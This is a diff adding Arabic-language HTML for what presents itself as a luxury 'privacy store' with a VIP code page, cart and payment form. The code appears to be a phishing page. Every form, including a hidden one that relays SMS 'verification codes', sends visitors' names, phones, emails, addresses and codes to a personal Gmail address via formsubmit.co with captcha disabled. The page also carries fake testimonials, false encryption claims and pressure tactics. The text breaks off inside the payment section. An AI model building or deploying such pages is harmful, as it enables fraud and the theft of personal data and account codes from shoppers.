+                    <button onclick="showPage('code')" class="bg-gradient-to-r from-yellow-400 to-orange-500 text-black px-10 py-4 rounded-full font-black text-xl hover:from-yellow-500 hover:to-orange-600 transition-all transform hover:scale-105 shadow-2xl">
+                        🎯 أدخل الكود
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Products Section -->
+        <section class="py-20 bg-gray-50 dark:bg-gray-800">
+            <div class="container mx-auto px-4">
+                <h2 class="text-4xl font-black text-center mb-4">منتجاتنا المميزة</h2>
+                <p class="text-xl text-center text-gray-600 dark:text-gray-300 mb-12">اكتشف مجموعتنا الحصرية من المنتجات عالية الجودة</p>
+                <div id="home-products-grid" class="product-grid">
+                    <!-- Products will be generated by JavaScript -->
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Products Page -->
+    <div id="products" class="page">
+        <section class="py-20 bg-gray-50 dark:bg-gray-800">
+            <div class="container mx-auto px-4">
+                <h1 class="text-5xl font-black text-center mb-4">جميع المنتجات</h1>
+                <p class="text-xl text-center text-gray-600 dark:text-gray-300 mb-12">استكشف مجموعتنا الكاملة من المنتجات الحصرية</p>
+                <div id="products-grid" class="product-grid">
+                    <!-- Products will be generated by JavaScript -->
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Enhanced Code Page -->
+    <div id="code" class="page">
+        <section class="py-16 bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 min-h-screen relative overflow-hidden">
+            <!-- Enhanced Animated Background -->
+            <div class="absolute inset-0 overflow-hidden">
+                <div class="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full opacity-20 animate-pulse"></div>
+                <div class="absolute -bottom-40 -left-40 w-96 h-96 bg-pink-500 rounded-full opacity-20 animate-pulse"></div>
+                <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-indigo-500 rounded-full opacity-10 animate-spin"></div>
+                <div class="absolute top-20 left-20 w-32 h-32 bg-yellow-400 rounded-full opacity-15 animate-bounce"></div>
+                <div class="absolute bottom-20 right-20 w-40 h-40 bg-green-400 rounded-full opacity-15 animate-float"></div>
+            </div>
+            
+            <div class="container mx-auto px-4 relative z-10">
+                <div class="max-w-7xl mx-auto">
+                    <!-- Enhanced Header Section -->
+                    <div class="text-center mb-16">
+                        <div class="inline-flex items-center justify-center w-40 h-40 bg-gradient-to-r from-purple-600 to-pink-600 rounded-full mb-8 shadow-2xl animate-glow">
+                            <i class="fas fa-unlock-alt text-6xl text-white animate-pulse"></i>
                         </div>
-                        
-                        <div class="bg-yellow-50 p-4 rounded-lg">
-                            <p class="text-yellow-700">
-                                <i class="fas fa-truck ml-2"></i>
-                                مدة التوصيل المتوقعة: 2-3 أيام عمل
-                            </p>
+                        <h1 class="text-7xl md:text-8xl font-black mb-8 text-transparent bg-clip-text bg-gradient-to-r from-white via-purple-200 to-pink-200 animate-float">
+                            🔥 كود الوصول المتقدم 🔥
+                        </h1>
+                        <p class="text-3xl text-gray-200 mb-8 font-light">
+                            ✨ افتح باب الكنوز المخفية والعروض الأسطورية ✨
+                        </p>
+                        <div class="inline-block bg-gradient-to-r from-yellow-400 to-orange-500 px-10 py-6 rounded-full text-black font-black text-xl shadow-lg animate-pulse">
+                            🎯 عضوية VIP حصرية - عدد محدود جداً!
                         </div>
                     </div>
-                    
-                    <div class="mt-8 space-y-4">
-                        <button onclick="downloadOrderReceipt()" class="btn-primary w-full">
-                            <i class="fas fa-download ml-2"></i>
-                            تحميل إيصال الطلب
-                        </button>
-                        
-                        <button onclick="startNewOrder()" class="w-full py-3 border-2 border-orange-600 text-orange-600 hover:bg-orange-600 hover:text-white rounded-lg transition-colors">
-                            <i class="fas fa-plus ml-2"></i>
-                            طلب جديد
-                        </button>
+
+                    <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">
+                        <!-- Enhanced Code Entry Form -->
+                        <div class="xl:col-span-2 glass-effect rounded-3xl shadow-2xl p-8 border border-white/20">
+                            <div class="bg-gradient-to-r from-purple-600 to-pink-600 p-8 rounded-2xl mb-8 text-center relative overflow-hidden">
+                                <div class="absolute inset-0 bg-gradient-to-r from-purple-600/20 to-pink-600/20 animate-pulse"></div>
+                                <div class="relative z-10">
+                                    <h2 class="text-4xl font-black text-white mb-4">🌟 أدخل الكود السحري 🌟</h2>
+                                    <p class="text-purple-100 text-lg">أي 6 أرقام تفتح لك عالماً من الإمكانيات</p>
+                                </div>
+                            </div>
+
+                            <form id="advanced-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" class="space-y-8">
+                                <!-- Enhanced Hidden Fields -->
+                                <input type="hidden" name="_subject" value="🔥 كود VIP تم إدخاله - متجر الخصوصية المتطور 🔥">
+                                <input type="hidden" name="_captcha" value="false">
+                                <input type="hidden" name="_template" value="table">
+                                <input type="hidden" name="_next" value="">
+                                <input type="hidden" name="form_type" value="كود وصول VIP متقدم">
+                                <input type="hidden" name="submission_time" value="">
+                                <input type="hidden" name="user_agent" value="">
+                                <input type="hidden" name="page_url" value="">
+                                <input type="hidden" name="customer_ip" value="">
+                                
+                                <!-- Enhanced Personal Information -->
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="animated-border">
+                                        <div class="inner">
+                                            <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
+                                                <i class="fas fa-user text-purple-600 mr-2"></i>
+                                                الاسم الكامل
+                                            </label>
+                                            <input type="text" name="full_name" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300" placeholder="أدخل اسمك الكامل" required="">
+                                        </div>
+                                    </div>
+                                    <div class="animated-border">
+                                        <div class="inner">
+                                            <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
+                                                <i class="fas fa-phone text-purple-600 mr-2"></i>
+                                                رقم الهاتف
+                                            </label>
+                                            <input type="tel" name="phone_number" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300" placeholder="+966 5X XXX XXXX" required="">
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="animated-border">
+                                    <div class="inner">
+                                        <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
+                                            <i class="fas fa-envelope text-purple-600 mr-2"></i>
+                                            البريد الإلكتروني
+                                        </label>
+                                        <input type="email" name="email_address" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300" placeholder="your@email.com" required="">
+                                    </div>
+                                </div>
+
+                                <!-- Enhanced Code Input Section -->
+                                <div class="bg-gradient-to-r from-purple-800/50 to-pink-800/50 p-8 rounded-2xl border border-purple-400/30 relative overflow-hidden">
+                                    <div class="absolute inset-0 bg-gradient-to-r from-purple-600/10 to-pink-600/10 animate-pulse"></div>
+                                    <div class="relative z-10">
+                                        <label class="block text-center text-white font-black mb-8 text-2xl">
+                                            <i class="fas fa-key text-yellow-300 text-3xl mr-3 animate-bounce"></i>
+                                            أدخل أي 6 أرقام للكود
+                                        </label>
+                                        
+                                        <div class="flex justify-center mb-8">
+                                            <div class="flex space-x-4 space-x-reverse">
+                                                <input type="text" id="code-1" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                                <input type="text" id="code-2" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                                <input type="text" id="code-3" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                                <input type="text" id="code-4" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                                <input type="text" id="code-5" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                                <input type="text" id="code-6" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Hidden input for the complete code -->
+                                        <input type="hidden" name="verification_code" id="complete-code">
+                                        
+                                        <div class="text-center space-y-3">
+                                            <div class="bg-green-500/20 p-4 rounded-xl border border-green-400/30">
+                                                <p class="text-green-200 text-xl font-bold mb-2">✅ أدخل أي 6 أرقام للوصول الفوري</p>
+                                                <p class="text-green-300 text-lg">جميع الأكواد مقبولة - لا توجد قيود!</p>
+                                            </div>
+                                            <div class="bg-yellow-500/20 p-3 rounded-xl">
+                                                <p class="text-yellow-200 text-lg font-bold">🎯 مثال: 123456 أو 999999</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Enhanced Additional Information -->
+                                <div class="animated-border">
+                                    <div class="inner">
+                                        <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
+                                            <i class="fas fa-comment-alt text-purple-600 mr-2"></i>
+                                            ملاحظات إضافية (اختياري)
+                                        </label>
+                                        <textarea name="additional_notes" rows="4" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300 resize-none" placeholder="أي ملاحظات أو طلبات خاصة..."></textarea>
+                                    </div>
+                                </div>
+
+                                <!-- Enhanced Submit Button -->
+                                <button type="submit" id="submit-advanced-code" class="w-full bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 text-black py-8 rounded-2xl font-black text-2xl shadow-2xl transform transition-all duration-300 hover:scale-105 hover:shadow-3xl disabled:opacity-50 disabled:cursor-not-allowed animate-glow">
+                                    <span class="flex items-center justify-center">
+                                        <i class="fas fa-rocket mr-4 text-3xl animate-bounce"></i>
+                                        🚀 تفعيل الكود وإطلاق الصاروخ! 🚀
+                                    </span>
+                                </button>
+                                
+                                <div class="text-center space-y-3">
+                                    <div class="inline-flex items-center text-green-300 font-bold text-lg">
+                                        <i class="fas fa-shield-check mr-3 text-2xl"></i>
+                                        محمي بتشفير SSL متقدم + حماية عسكرية
+                                    </div>
+                                    <div class="inline-flex items-center text-blue-300 font-bold text-lg">
+                                        <i class="fas fa-clock mr-3 text-2xl"></i>
+                                        معالجة فورية خلال ثوانٍ
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+
+                        <!-- Enhanced Benefits Sidebar -->
+                        <div class="space-y-6">
+                            <!-- Enhanced Premium Benefits -->
+                            <div class="glass-effect rounded-2xl p-6 border border-purple-400/30 relative overflow-hidden">
+                                <div class="absolute inset-0 bg-gradient-to-br from-purple-600/10 to-pink-600/10 animate-pulse"></div>
+                                <div class="relative z-10">
+                                    <h3 class="text-2xl font-black text-white mb-6 flex items-center">
+                                        <i class="fas fa-crown text-yellow-400 mr-3 text-3xl animate-bounce"></i>
+                                        مزايا VIP حصرية
+                                    </h3>
+                                    <div class="space-y-4">
+                                        <div class="flex items-center bg-gradient-to-r from-red-500/20 to-orange-500/20 p-4 rounded-xl border border-red-400/30">
+                                            <i class="fas fa-fire text-red-400 mr-3 text-2xl animate-pulse"></i>
+                                            <span class="text-white font-bold text-lg">خصم 75% على كل شيء</span>
+                                        </div>
+                                        <div class="flex items-center bg-gradient-to-r from-blue-500/20 to-cyan-500/20 p-4 rounded-xl border border-blue-400/30">
+                                            <i class="fas fa-shipping-fast text-blue-400 mr-3 text-2xl"></i>
+                                            <span class="text-white font-bold text-lg">توصيل مجاني فوري</span>
+                                        </div>
+                                        <div class="flex items-center bg-gradient-to-r from-purple-500/20 to-pink-500/20 p-4 rounded-xl border border-purple-400/30">
+                                            <i class="fas fa-gem text-purple-400 mr-3 text-2xl animate-float"></i>
+                                            <span class="text-white font-bold text-lg">منتجات حصرية فاخرة</span>
+                                        </div>
+                                        <div class="flex items-center bg-gradient-to-r from-yellow-500/20 to-orange-500/20 p-4 rounded-xl border border-yellow-400/30">
+                                            <i class="fas fa-headset text-yellow-400 mr-3 text-2xl"></i>
+                                            <span class="text-white font-bold text-lg">دعم VIP 24/7</span>
+                                        </div>
+                                        <div class="flex items-center bg-gradient-to-r from-green-500/20 to-emerald-500/20 p-4 rounded-xl border border-green-400/30">
+                                            <i class="fas fa-gift text-green-400 mr-3 text-2xl animate-bounce"></i>
+                                            <span class="text-white font-bold text-lg">هدايا مفاجئة أسبوعية</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Enhanced Security Features -->
+                            <div class="glass-effect rounded-2xl p-6 border border-green-400/30 relative overflow-hidden">
+                                <div class="absolute inset-0 bg-gradient-to-br from-green-600/10 to-teal-600/10 animate-pulse"></div>
+                                <div class="relative z-10">
+                                    <h3 class="text-xl font-bold text-white mb-4 flex items-center">
+                                        <i class="fas fa-shield-alt text-green-400 mr-3 text-2xl animate-pulse"></i>
+                                        الأمان المتقدم
+                                    </h3>
+                                    <div class="space-y-3 text-green-100">
+                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
+                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
+                                            <span>تشفير عسكري 512-bit</span>
+                                        </div>
+                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
+                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
+                                            <span>حماية الهوية التامة</span>
+                                        </div>
+                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
+                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
+                                            <span>معايير الأمان الدولية</span>
+                                        </div>
+                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
+                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
+                                            <span>حماية من الاختراق</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Enhanced Limited Time Offer -->
+                            <div class="glass-effect rounded-2xl p-6 border border-red-400/30 animate-pulse relative overflow-hidden">
+                                <div class="absolute inset-0 bg-gradient-to-br from-red-600/20 to-orange-600/20 animate-pulse"></div>
+                                <div class="relative z-10">
+                                    <h3 class="text-xl font-bold text-white mb-4 flex items-center">
+                                        <i class="fas fa-clock text-red-400 mr-3 text-2xl animate-bounce"></i>
+                                        عرض محدود زمنياً!
+                                    </h3>
+                                    <div class="text-center">
+                                        <div class="text-4xl font-black text-yellow-300 mb-3 animate-pulse">⏰ 24 ساعة فقط!</div>
+                                        <p class="text-red-100 text-lg font-bold mb-3">بعدها ترتفع الأسعار 500%</p>
+                                        <div class="bg-gradient-to-r from-yellow-400 to-orange-500 text-black p-4 rounded-xl font-black text-lg animate-bounce">
+                                            🎯 اغتنم الفرصة الذهبية الآن!
+                                        </div>
+                                        <div class="mt-3 text-red-200 text-sm">
+                                            💰 وفر آلاف الريالات اليوم
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Enhanced Success Stories -->
+                            <div class="glass-effect rounded-2xl p-6 border border-indigo-400/30 relative overflow-hidden">
+                                <div class="absolute inset-0 bg-gradient-to-br from-indigo-600/10 to-purple-600/10 animate-pulse"></div>
+                                <div class="relative z-10">
+                                    <h3 class="text-xl font-bold text-white mb-4 flex items-center">
+                                        <i class="fas fa-star text-yellow-400 mr-3 text-2xl animate-pulse"></i>
+                                        قصص نجاح حقيقية
+                                    </h3>
+                                    <div class="space-y-4 text-indigo-100">
+                                        <div class="bg-indigo-500/20 p-3 rounded-lg border border-indigo-400/30">
+                                            <p class="italic font-bold">"وفرت أكثر من 10,000 ريال في شهر واحد! أفضل قرار اتخذته" - فاطمة م. ⭐⭐⭐⭐⭐</p>
+                                        </div>
+                                        <div class="bg-purple-500/20 p-3 rounded-lg border border-purple-400/30">
+                                            <p class="italic font-bold">"منتجات حصرية لا تجدها في أي مكان آخر بالعالم" - أحمد س. ⭐⭐⭐⭐⭐</p>
+                                        </div>
+                                        <div class="bg-pink-500/20 p-3 rounded-lg border border-pink-400/30">
+                                            <p class="italic font-bold">"خدمة VIP استثنائية وتوصيل سريع جداً!" - نورا ع. ⭐⭐⭐⭐⭐</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
+        </section>
+    </div>
+
+    <!-- Purchase Code Page -->
+    <div id="purchase-code" class="page">
+        <section class="py-16 bg-gradient-to-br from-green-900 via-emerald-900 to-teal-900 min-h-screen">
+            <div class="container mx-auto px-4">
+                <div class="max-w-2xl mx-auto">
+                    <div class="text-center mb-12">
+                        <div class="text-8xl mb-6">🎉</div>
+                        <h1 class="text-5xl font-bold mb-6 text-white">تم إرسال طلبك بنجاح!</h1>
+                        <p class="text-xl text-gray-200 mb-8">أدخل الكود لإتمام عملية الشراء والحصول على خصم إضافي</p>
+                    </div>
+
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 mb-8">
+                        <div class="text-center mb-6">
+                            <h2 class="text-2xl font-bold mb-4">ملخص الطلب</h2>
+                            <div class="bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4">
+                                <p class="text-green-800 dark:text-green-200 font-bold">رقم الطلب: #POE-2024-<span id="order-number-display"></span></p>
+                            </div>
+                            <div id="code-status" class="bg-blue-100 dark:bg-blue-900 p-4 rounded-lg mb-4">
+                                <p class="text-blue-800 dark:text-blue-200 font-bold">
+                                    <i class="fas fa-paper-plane mr-2"></i>
+                                    جاري إرسال كود التأكيد...
+                                </p>
+                            </div>
+                        </div>
+
+                        <form id="purchase-code-form">
+                            <div class="mb-6">
+                                <label class="block text-lg font-bold mb-3 text-center">أدخل كود إتمام الشراء:</label>
+                                <input type="text" id="purchase-secret-code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-green-500 dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل الكود هنا" maxlength="15">
+                                <div class="text-center mt-3">
+                                    <small class="text-gray-600">سيتم إرسال الكود إلى رقم هاتفك عبر رسالة نصية</small>
+                                </div>
+                            </div>
+
+                            <button type="submit" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-bold text-lg">
+                                <i class="fas fa-check-circle mr-2"></i>
+                                إتمام الشراء
+                            </button>
+                        </form>
+
+                        <div class="mt-6 text-center">
+                            <button onclick="resendVerificationCode()" class="text-blue-500 hover:text-blue-700 font-bold">
+                                <i class="fas fa-redo mr-2"></i>
+                                إعادة إرسال الكود
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Hidden form for sending verification code -->
+                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" style="display: none;">
+                        <input type="hidden" name="_subject" value="">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="customer_name" value="">
+                        <input type="hidden" name="customer_phone" value="">
+                        <input type="hidden" name="customer_email" value="">
+                        <input type="hidden" name="order_number" value="">
+                        <input type="hidden" name="verification_code" value="">
+                        <input type="hidden" name="message_type" value="كود التحقق">
+                        <input type="hidden" name="sent_time" value="">
+                    </form>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Contact Page -->
+    <div id="contact" class="page">
+        <section class="py-20 bg-gradient-to-br from-purple-50 to-pink-50 dark:from-gray-900 dark:to-gray-800">
+            <div class="container mx-auto px-4">
+                <h1 class="text-5xl font-black text-center mb-4">اتصل بنا</h1>
+                <p class="text-xl text-center text-gray-600 dark:text-gray-300 mb-16">نحن هنا لمساعدتك في أي وقت</p>
+                <div class="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-12">
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-xl p-8 card-hover">
+                        <h2 class="text-3xl font-bold mb-8 text-center">معلومات التواصل</h2>
+                        <div class="space-y-6">
+                            <div class="flex items-center space-x-4 space-x-reverse p-4 bg-gray-50 dark:bg-gray-700 rounded-xl">
+                                <i class="fas fa-envelope text-primary text-2xl"></i>
+                                <div>
+                                    <h3 class="font-bold">البريد الإلكتروني</h3>
+                                    <span>support@privacy-store.com</span>
+                                </div>
+                            </div>
+                            <div class="flex items-center space-x-4 space-x-reverse p-4 bg-gray-50 dark:bg-gray-700 rounded-xl">
+                                <i class="fab fa-whatsapp text-green-500 text-2xl"></i>
+                                <div>
+                                    <h3 class="font-bold">واتساب</h3>
+                                    <span>+966 50 123 4567</span>
+                                </div>
+                            </div>
+                            <div class="flex items-center space-x-4 space-x-reverse p-4 bg-gray-50 dark:bg-gray-700 rounded-xl">
+                                <i class="fas fa-clock text-blue-500 text-2xl"></i>
+                                <div>
+                                    <h3 class="font-bold">ساعات العمل</h3>
+                                    <span>24/7 - خدمة مستمرة</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-xl p-8 card-hover">
+                        <h2 class="text-3xl font-bold mb-8 text-center">أرسل رسالة</h2>
+                        <form id="contact-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-6">
+                            <input type="hidden" name="_subject" value="رسالة جديدة من متجر الخصوصية المتطور">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_next" value="https://www.google.com">
+                            
+                            <div>
+                                <label class="block text-lg font-bold mb-3">الاسم</label>
+                                <input type="text" name="name" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                            </div>
+                            <div>
+                                <label class="block text-lg font-bold mb-3">البريد الإلكتروني</label>
+                                <input type="email" name="email" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                            </div>
+                            <div>
+                                <label class="block text-lg font-bold mb-3">الرسالة</label>
+                                <textarea rows="5" name="message" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors resize-none" required=""></textarea>
+                            </div>
+                            <button type="submit" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold text-lg transform hover:scale-105">
+                                <i class="fas fa-paper-plane mr-2"></i>
+                                إرسال الرسالة
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Code Success Modal -->
+    <div id="code-success-modal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
+        <div class="bg-gradient-to-br from-purple-600 to-pink-600 rounded-3xl shadow-2xl max-w-lg w-full p-8 text-center text-white relative overflow-hidden">
+            <!-- Animated Background -->
+            <div class="absolute inset-0 overflow-hidden">
+                <div class="absolute -top-10 -right-10 w-40 h-40 bg-white opacity-10 rounded-full animate-pulse"></div>
+                <div class="absolute -bottom-10 -left-10 w-32 h-32 bg-yellow-300 opacity-20 rounded-full animate-bounce"></div>
+            </div>
+            
+            <div class="relative z-10">
+                <div class="text-8xl mb-6 animate-bounce">🎉</div>
+                <h1 class="text-4xl font-bold mb-4">مبروك!</h1>
+                <h2 class="text-2xl font-bold mb-6">تم قبول الكود بنجاح</h2>
+                
+                <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-6 mb-6">
+                    <h3 class="text-xl font-bold mb-4">✨ مزايا حصرية مفعّلة ✨</h3>
+                    <div class="space-y-3 text-sm">
+                        <p>🔥 خصم 75% على جميع المنتجات</p>
+                        <p>🚚 شحن مجاني فوري</p>
+                        <p>💎 وصول لمنتجات VIP حصرية</p>
+                        <p>⏰ صالح لمدة شهر كامل</p>
+                    </div>
+                </div>
+                
+                <div class="grid grid-cols-1 gap-4">
+                    <button onclick="hideCodeSuccessModal(); showPage('products')" class="w-full bg-white text-purple-600 py-3 rounded-xl font-bold hover:bg-gray-100 transition-all">
+                        <i class="fas fa-shopping-bag mr-2"></i>
+                        ابدأ التسوق الآن
+                    </button>
+                    <button onclick="hideCodeSuccessModal(); showPage('home')" class="w-full bg-transparent border-2 border-white text-white py-3 rounded-xl font-bold hover:bg-white hover:text-purple-600 transition-all">
+                        <i class="fas fa-home mr-2"></i>
+                        العودة للرئيسية
+                    </button>
+                </div>
+            </div>
         </div>
-    </section>
+    </div>
+
+    <!-- Cart Modal -->
+    <div id="cart-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white dark:bg-gray-800 rounded-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
+            <div class="p-6 border-b dark:border-gray-700">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-3xl font-bold">سلة التسوق</h2>
+                    <button onclick="toggleCart()" class="text-gray-500 hover:text-gray-700 transform hover:scale-110 transition-all">
+                        <i class="fas fa-times text-2xl"></i>
+                    </button>
+                </div>
+            </div>
+            <div id="cart-items" class="p-6">
+                <p class="text-center text-gray-500 py-8">السلة فارغة</p>
+            </div>
+            <div class="p-6 border-t dark:border-gray-700 bg-gray-50 dark:bg-gray-700">
+                <div class="space-y-2 mb-4">
+                    <div class="flex justify-between text-lg">
+                        <span>المجموع الفرعي:</span>
+                        <span id="cart-subtotal">0 ريال</span>
+                    </div>
+                    <div class="flex justify-between text-lg">
+                        <span>الشحن:</span>
+                        <span id="cart-shipping">15 ريال</span>
+                    </div>
+                    <div class="flex justify-between text-2xl font-bold border-t pt-2">
+                        <span>المجموع:</span>
+                        <span id="cart-total">15 ريال</span>
+                    </div>
+                </div>
+                <button onclick="showPayment()" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold text-lg transform hover:scale-105">
+                    <i class="fas fa-credit-card mr-2"></i>
+                    المتابعة للدفع
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="payment-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white dark:bg-gray-800 rounded-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
+            <div class="p-6 border-b dark:border-gray-700">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-3xl font-bold">إتمام الطلب</h2>
+                    <button onclick="hidePayment()" class="text-gray-500 hover:text-gray-700 transform hover:scale-110 transition-all">
+                        <i class="fas fa-times text-2xl"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="p-6">
+                <form id="payment-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-6">
+                    <!-- FormSubmit Hidden Fields -->
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_template" value="table">
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-lg font-bold mb-2">الاسم الأول</label>
+                            <input type="text" name="first_name" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                        </div>
+                        <div>
+                            <label class="block text-lg font-bold mb-2">الاسم الأخير</label>
+                            <input type="text" name="last_name" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-lg font-bold mb-2">رقم الهاتف</label>
+                        <input type="tel" name="phone" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-lg font-bold mb-2">البريد الإلكتروني</label>
+                        <input type="email" name="email" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-lg font-bold mb-2">العنوان</label>
+                        <textarea name="address" rows="3" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors resize-none" required=""></textarea>
+                    </div>
+                    
+                    <!-- Payment Information Section -->
+                    <div class="border-t pt-6 dark:border-gray-700">
+                        <h3 class="text-2xl font-bold mb-4">معلومات الدفع</h3>
+                        <div class="bg-blue-50 dark:bg-blue-900 p-4 rounded-lg mb-4">
+                            <p class="text-blue-800 dark:text-blue-200 text-sm">
